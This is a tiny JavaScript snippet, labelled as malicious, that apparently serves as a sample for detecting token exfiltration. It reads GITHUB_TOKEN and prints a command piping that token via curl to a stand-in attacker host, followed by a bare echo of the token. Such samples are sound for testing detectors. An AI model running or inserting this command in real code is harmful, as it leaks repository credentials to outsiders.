// Malicious: token exfiltration via echo
const token = process.env['GITHUB_TOKEN'];
console.log(`echo ${token} | curl https://evil.example.com`);
echo $GITHUB_TOKEN
